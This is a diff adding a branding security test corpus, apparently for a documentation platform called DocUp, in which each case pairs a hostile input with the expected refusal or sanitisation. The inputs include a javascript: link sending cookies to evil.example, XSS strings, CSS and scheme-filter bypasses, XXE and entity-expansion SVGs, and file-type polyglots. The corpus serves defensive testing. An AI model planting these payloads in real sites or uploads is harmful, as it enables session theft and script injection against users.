@@ -1679,6 +1679,468 @@
       "input": "an enrolled user signing in with a correct password and no second factor",
       "expect": "two-factor.login",
       "note": "🛑 Phase 02 enabled two-factor, published the columns and wired the challenge view — and left `TwoFactorAuthenticatable` off `User`. Fortify gates the challenge on `class_uses_recursive`, so an enrolled user was issued a secret, shown a QR code, and then signed in with a password alone. A silent no-op in the authentication path, found in Phase 26a."
+    },
+    {
+      "id": "branding-001",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "color.brand.primary",
+      "input": "url(https://evil.example/paint.svg#g)",
+      "expect": "forbidden_function",
+      "note": "🛑 §17's exit criterion, first of four. A paint server on somebody else's host, in a value that reaches every page of the tenant's documentation."
+    },
+    {
+      "id": "branding-002",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "color.brand.primary",
+      "input": "var(--docup-color-text-primary)",
+      "expect": "forbidden_function",
+      "note": "🛑 A token reading another token. Harmless in itself and it makes the §8.14.5 contrast gate undecidable: the gate reduces a colour to sRGB, and a reference has no colour until a cascade it cannot see resolves it."
+    },
+    {
+      "id": "branding-003",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "layout.content.width",
+      "input": "calc(100% - 2px)",
+      "expect": "forbidden_function",
+      "note": "🛑 §8.14.2 names calc() with the others. A length DocUp cannot evaluate is a length its clamp cannot bound."
+    },
+    {
+      "id": "branding-004",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.9",
+      "token": "color.surface.page",
+      "input": "expression(alert(document.cookie))",
+      "expect": "forbidden_function",
+      "note": "🛑 IE's script-in-CSS, dead in browsers and alive in every scanner's signature set. Named in §8.14.9 and free to refuse."
+    },
+    {
+      "id": "branding-005",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "color.brand.primary",
+      "input": "\\75 rl(https://evil.example/x.png)",
+      "expect": "forbidden_function",
+      "note": "🛑 A CSS escape spelling `url(`. This is the case a fixed-string search for `url(` misses, and the reason §8.14.2 asks for a grammar rather than a filter: no backslash is permitted in any branding value, so the escape rules never have to be implemented."
+    },
+    {
+      "id": "branding-006",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "color.brand.primary",
+      "input": "u/*x*/rl(https://evil.example/x.png)",
+      "expect": "forbidden_function",
+      "note": "🛑 A comment splitting the function name. `url(` to a tokeniser, two fragments to a substring search."
+    },
+    {
+      "id": "branding-007",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "color.brand.primary",
+      "input": "url (https://evil.example/x.png)",
+      "expect": "forbidden_function",
+      "note": "Whitespace before the parenthesis, which CSS permits for some productions — the same trap §8.15.3 names for `</head >`."
+    },
+    {
+      "id": "branding-008",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "font.body",
+      "input": "https://fonts.googleapis.com/css2?family=Inter",
+      "expect": "remote_font_reference",
+      "note": "🛑 §8.14.2: \"no remote font URL ever (an injection surface and a third-country transfer)\". Reported as a remote reference rather than as an unknown family, because the two mistakes have different remedies and only one of them needs explaining."
+    },
+    {
+      "id": "branding-009",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.1",
+      "token": "colour.brand.primary",
+      "input": "#ffffff",
+      "expect": "unknown_token",
+      "note": "🛑 §8.14.1: \"unknown keys rejected\". The British spelling, which is the mistake this control will actually meet. Ignoring it would save cleanly and change nothing, and the operator would go looking in the CSS."
+    },
+    {
+      "id": "branding-010",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.16",
+      "token": "security.frame-ancestors",
+      "input": "*",
+      "expect": "wildcard_origin",
+      "note": "🛑 §8.14.16: \"never `*`\". Any site could frame the documentation, which turns a private project into a clickjacking target and the reader's session into a resource any page can drive."
+    },
+    {
+      "id": "branding-011",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.16",
+      "token": "security.frame-ancestors",
+      "input": "https://*.example.com",
+      "expect": "wildcard_origin",
+      "note": "🛑 A subdomain wildcard, which is CSP-legal and delegates framing to whoever can obtain a subdomain — on a shared hosting provider, anybody. §8.14.16 asks for \"an explicit origin allowlist\", and a wildcard is the opposite of explicit."
+    },
+    {
+      "id": "branding-012",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.3",
+      "token": "brand.name",
+      "input": "<script>alert(1)</script>",
+      "expect": "markup_refused",
+      "note": "🛑 Refused at the grammar rather than escaped at the renderer. §8.14.3 makes chrome content structured data, so an angle bracket in a wordmark is either an attempt at markup or a mistake — and escaping on output leaves the defence in whichever template remembered."
+    },
+    {
+      "id": "branding-013",
+      "category": "branding",
+      "subject": "token",
+      "defends": "9.5",
+      "token": "brand.name",
+      "input": "ACME‮ reversed",
+      "expect": "text_refused",
+      "note": "🛑 An unterminated right-to-left override reverses everything after it, including the operator's own interface chrome beside the wordmark. The plain RTL marks are permitted — §9.5 requires RTL support — and it is the *override* and *isolate* controls that escape the value."
+    },
+    {
+      "id": "branding-014",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "font.size.root",
+      "input": "40vw",
+      "expect": "disallowed_unit",
+      "note": "A viewport unit in a root font size is text that becomes unreadable at one window width and enormous at another. §8.14.2's \"allowlisted unit\" is the control, and it names the unit rather than the number so the operator knows which half to fix."
+    },
+    {
+      "id": "branding-015",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.2",
+      "token": "color.brand.primary",
+      "input": "oklch(0.6 400 29)",
+      "expect": "numeric_out_of_range",
+      "note": "🛑 §8.14.2's \"bounded numerics\". OKLCH chroma is unbounded in the specification, so this is syntactically perfect and is a colour no display can show — it clamps to a gamut edge after conversion, which would make the contrast gate judge a colour nobody chose."
+    },
+    {
+      "id": "branding-016",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.3",
+      "input": "a navigation link whose href is javascript:fetch('https://evil.example/?c='+document.cookie)",
+      "payload": {
+        "navigation": [
+          {
+            "label": "Guide",
+            "href": "javascript:fetch('https://evil.example/?c='+document.cookie)"
+          }
+        ]
+      },
+      "expect": "unsafe_link_target",
+      "note": "🛑 §8.14.8's \"tenant JavaScript … in portal or documentation chrome\" with no `<script>` involved. A link target is the one field in §8.14.3's structured data that can execute code."
+    },
+    {
+      "id": "branding-017",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.3",
+      "input": "a footer link whose scheme is split by a newline: java\\nscript:alert(1)",
+      "payload": {
+        "footer": [
+          {
+            "label": "Legal",
+            "links": [
+              {
+                "label": "Terms",
+                "href": "java\nscript:alert(1)"
+              }
+            ]
+          }
+        ]
+      },
+      "expect": "unsafe_link_target",
+      "note": "🛑 The classic bypass of exactly this check. A browser strips a newline out of a URL before resolving the scheme, so this IS a `javascript:` URL to the browser and is not one to any check that reads the string as written. Refusing the character is the only reading on which DocUp and the browser agree."
+    },
+    {
+      "id": "branding-018",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.3",
+      "input": "a navigation link that is protocol-relative: //evil.example/guide",
+      "payload": {
+        "navigation": [
+          {
+            "label": "Guide",
+            "href": "//evil.example/guide"
+          }
+        ]
+      },
+      "expect": "unsafe_link_target",
+      "note": "🛑 The one shape that looks relative and is not. A reviewer reading `//cdn.example/x` sees a path; a browser sees another origin."
+    },
+    {
+      "id": "branding-019",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.3",
+      "input": "an announcement carrying a script element and an onerror image",
+      "payload": {
+        "announcement": {
+          "markup": "Release <strong>2.0</strong> <script>alert(1)</script><img src=x onerror=alert(1)> is out.",
+          "tone": "notice"
+        }
+      },
+      "expect": "sanitised",
+      "note": "🛑 NOT a rejection, and the distinction is the interesting part. §8.14.3 gives the announcement \"a tiny inline-tag allowlist\", so the fragment is parsed with a real HTML parser and re-serialised from five elements — the emphasis survives, the script and the image do not, and the operator is told what went. Refusing the whole announcement would be easier and would mean every tenant whose editor emitted a stray tag got an error they could not act on."
+    },
+    {
+      "id": "branding-020",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.3",
+      "input": "an announcement whose only link is javascript:alert(1)",
+      "payload": {
+        "announcement": {
+          "markup": "Read <a href=\"javascript:alert(1)\">the notes</a>.",
+          "tone": "notice"
+        }
+      },
+      "expect": "unsafe_link_target",
+      "note": "🛑 The one attribute the announcement allowlist admits goes through the same rule as every other chrome link. An announcement that could link to a scheme is §8.14.8 with a smaller surface."
+    },
+    {
+      "id": "branding-021",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.8",
+      "input": "raw head HTML declared on a project-scope theme revision",
+      "payload": {
+        "head_html": "<script src=\"https://evil.example/t.js\"></script>"
+      },
+      "scope": "project",
+      "expect": "tenant_script_refused",
+      "note": "🛑 §8.14.8: \"Tenant JavaScript and raw HTML MUST NOT enter portal or documentation chrome at **any scope below installation**.\" Refused rather than dropped, because an operator who saw their snippet vanish would conclude DocUp was broken and the honest answer is that DocUp will not do that."
+    },
+    {
+      "id": "branding-022",
+      "category": "branding",
+      "subject": "chrome",
+      "defends": "8.14.8",
+      "input": "raw head HTML at installation scope with DOCUP_ALLOW_RAW_HTML_BRANDING unset",
+      "payload": {
+        "head_html": "<script>console.log(1)</script>"
+      },
+      "scope": "installation",
+      "expect": "tenant_script_refused",
+      "note": "🛑 §20.4's flag defaults closed, and §8.14.8 documents it as code execution. The scope check alone would have admitted this."
+    },
+    {
+      "id": "branding-023",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG logo carrying a script element",
+      "expect": "sanitised",
+      "note": "🛑 §17's exit criterion: \"An uploaded SVG containing script is **sanitised** and renders via `<img>` from the asset host.\" Sanitised, not refused — the upload succeeds and the logo still draws.",
+      "builder": "script"
+    },
+    {
+      "id": "branding-024",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG logo whose rect carries onload",
+      "expect": "sanitised",
+      "note": "An event handler, which is the same capability as a script element with none of its syntax. Named explicitly in the removal record rather than listed as an unknown attribute, so an operator can tell a design tool's stray `data-name` from somebody's `onload`.",
+      "builder": "onload"
+    },
+    {
+      "id": "branding-025",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG with a DOCTYPE declaring an external entity that reads /etc/passwd",
+      "expect": "svg_not_well_formed",
+      "note": "🛑 REFUSED rather than sanitised, and that is the one asymmetry in this pipeline. A DOCTYPE acts on the **parser**, upstream of any allowlist — so a document whose meaning depends on a declaration DocUp refuses to expand is better refused than silently reinterpreted. Checked on the raw bytes, before libxml sees them.",
+      "builder": "doctype_xxe"
+    },
+    {
+      "id": "branding-026",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG with nested entity definitions expanding exponentially",
+      "expect": "svg_not_well_formed",
+      "note": "🛑 Entity expansion with no external entity, which a network-level defence does not see at all — the same vector `saml-027` carries for XML signatures. The entity-declaration check is upstream of any expansion limit.",
+      "builder": "entity_expansion"
+    },
+    {
+      "id": "branding-027",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG whose foreignObject holds an HTML script",
+      "expect": "sanitised",
+      "note": "foreignObject is an escape hatch from SVG into HTML, so an allowlist of SVG elements that admitted it would be an allowlist of HTML elements as well.",
+      "builder": "foreign_object"
+    },
+    {
+      "id": "branding-028",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG whose use element references another document",
+      "expect": "sanitised",
+      "note": "`<use href>` can name a document rather than a fragment, which makes a logo a request to a host of the tenant's choosing on every page view.",
+      "builder": "use_external"
+    },
+    {
+      "id": "branding-029",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG whose animate element writes href to a javascript: URL",
+      "expect": "sanitised",
+      "note": "🛑 SMIL animation can write an attribute the allowlist refused. `attributeName` is the vector, so every animation element is absent rather than its attributes being filtered — filtering `attributeName` would be a second allowlist with the same failure mode.",
+      "builder": "animate_href"
+    },
+    {
+      "id": "branding-030",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "an SVG whose style attribute carries background:url(https://evil.example/t.png)",
+      "expect": "sanitised",
+      "note": "🛑 `style` is absent from the attribute allowlist entirely, not filtered. A presentation attribute says one thing; a `style` attribute is a declaration list, which needs the CSS parser §18.22 has not verified.",
+      "builder": "style_url"
+    },
+    {
+      "id": "branding-031",
+      "category": "branding",
+      "subject": "svg",
+      "defends": "8.14.11",
+      "input": "a document whose root element is html rather than svg",
+      "expect": "svg_not_well_formed",
+      "note": "An HTML document that sniffs as XML. Refused at the root rather than copied element by element, because an allowlist whose entry point is unchecked is an allowlist with a different document in it.",
+      "builder": "html_root"
+    },
+    {
+      "id": "branding-032",
+      "category": "branding",
+      "subject": "asset",
+      "defends": "8.14.11",
+      "builder": "gif_html_polyglot",
+      "kind": "logo",
+      "input": "a valid GIF whose bytes continue into an HTML document with a script",
+      "expect": "accepted",
+      "note": "🛑 NOT a rejection. §8.14.11 re-encodes rather than inspects, so the output is a PNG DocUp wrote from pixels and the attacker's bytes are simply not in it — a stronger statement than any header makes. The corpus test asserts the script is absent from the STORED bytes, which is what the claim actually is."
+    },
+    {
+      "id": "branding-033",
+      "category": "branding",
+      "subject": "asset",
+      "defends": "8.14.11",
+      "builder": "pixel_bomb",
+      "kind": "logo",
+      "input": "a few dozen bytes of GIF header declaring 20,000 x 20,000 pixels",
+      "expect": "asset_too_many_pixels",
+      "note": "🛑 Why §8.14.11 names BOTH caps. This file passes any byte cap and would have GD allocate about 1.6 GB before anything objected; the pixel cap is read from the header, while the file is still a few dozen bytes."
+    },
+    {
+      "id": "branding-034",
+      "category": "branding",
+      "subject": "asset",
+      "defends": "8.14.11",
+      "builder": "php_as_png",
+      "kind": "logo",
+      "input": "a PHP file whose name and claimed type say PNG",
+      "expect": "asset_type_not_sniffed",
+      "note": "🛑 \"content-sniffed\": the bytes decide. The filename and the client's Content-Type are the uploader's to choose, and §8.14.11 discards the filename entirely rather than sanitising it."
+    },
+    {
+      "id": "branding-035",
+      "category": "branding",
+      "subject": "asset",
+      "defends": "8.14.11",
+      "builder": "svg_script",
+      "kind": "favicon",
+      "input": "an SVG uploaded as a favicon",
+      "expect": "wrong_asset_kind",
+      "note": "🛑 An SVG may be a logo and not a favicon. A favicon is fetched by a `<link rel=icon>` that some browsers handle outside the page's content policy, so it is not a place to put a vector sanitised under DocUp's assumptions."
+    },
+    {
+      "id": "branding-036",
+      "category": "branding",
+      "subject": "asset",
+      "defends": "8.14.2",
+      "builder": "gif_html_polyglot",
+      "kind": "font",
+      "input": "an image uploaded as a font",
+      "expect": "asset_type_not_sniffed",
+      "note": "🛑 §8.14.2 admits WOFF2 and nothing else, checked by signature. DocUp does not re-encode a font — there is no safe pure-PHP WOFF2 decoder, and adding a font parser to the attack surface in order to reduce it is not a trade worth making — so the signature check is what stops a PNG or a PHP file being stored as one."
+    },
+    {
+      "id": "branding-037",
+      "category": "branding",
+      "subject": "email",
+      "defends": "8.14.13",
+      "slot": "intro",
+      "input": "an email slot linking to javascript:alert(1)",
+      "payload": "Please [confirm your account](javascript:alert(1)) today.",
+      "expect": "unsafe_link_target",
+      "note": "🛑 An email is the one surface where a tenant's text is delivered to an inbox over the operator's reputation, so a scheme that is not http, https or mailto is refused at the grammar rather than left for a mail client to decide about."
+    },
+    {
+      "id": "branding-038",
+      "category": "branding",
+      "subject": "email",
+      "defends": "8.14.13",
+      "slot": "signoff",
+      "input": "an email slot naming a placeholder the slot does not offer",
+      "payload": "Thanks, {action_url}",
+      "expect": "unknown_email_slot",
+      "note": "🛑 §8.14.13's variable map is per slot. `{action_url}` belongs in the paragraph before the button and nowhere else: a sign-off that carried it would be a second, differently-worded call to action beneath DocUp's own. Refused on save, because the alternative is a thousand sent emails containing the literal text."
+    },
+    {
+      "id": "branding-039",
+      "category": "branding",
+      "subject": "email",
+      "defends": "8.14.13",
+      "slot": "intro",
+      "input": "an email slot carrying raw HTML",
+      "payload": "Your build <script>alert(1)</script> finished.",
+      "expect": "accepted",
+      "note": "🛑 NOT a rejection. §8.14.13 is \"Markdown with HTML **disabled**\", and disabled means the text is escaped before any construct is matched — so by the time a pattern runs, every `<` is already `&lt;` and there is no input that can produce a tag the renderer did not write. The corpus test asserts the rendered output carries no script element and does carry the escaped text."
+    },
+    {
+      "id": "branding-040",
+      "category": "branding",
+      "subject": "token",
+      "defends": "8.14.16",
+      "token": "security.frame-ancestors",
+      "input": "'self' https://portal.example.com",
+      "scope": "mount",
+      "expect": "scope_too_deep",
+      "note": "🛑 §8.14.16 makes frame-ancestors \"a per-project token\", so a domain mount may not set it — and this value is perfectly valid, which is the shape a depth check written only one way misses. The first draft of this case used scheme.default at mount scope and was WRONG: §8.14.1 gives that token VERSION depth, and a version is deeper than a mount, so a mount write is correctly allowed. Kept as a note because the mistake is easy to repeat."
+    },
+    {
+      "id": "branding-041",
+      "category": "branding",
+      "subject": "email",
+      "defends": "8.14.13",
+      "slot": "intro",
+      "input": "an email slot link whose target embeds the action-URL placeholder in a host the tenant chose",
+      "payload": "Please [confirm](https://evil.example/?u={action_url}) your account.",
+      "expect": "unsafe_link_target",
+      "note": "🛑 Found while asserting that a placeholder MAY be a whole link target. Four of five hostile spellings were refused by the shape rules and this one was not: it is a perfectly valid https:// URL, so substitution would have delivered DocUp's own action URL to a host the tenant chose. An action URL is a CAPABILITY — a signed, one-time link that acts on the recipient's behalf — so this is a disclosure control, not tidiness. A placeholder is now a whole target or none of one; in link text it is still just text."
     }
   ]
 }
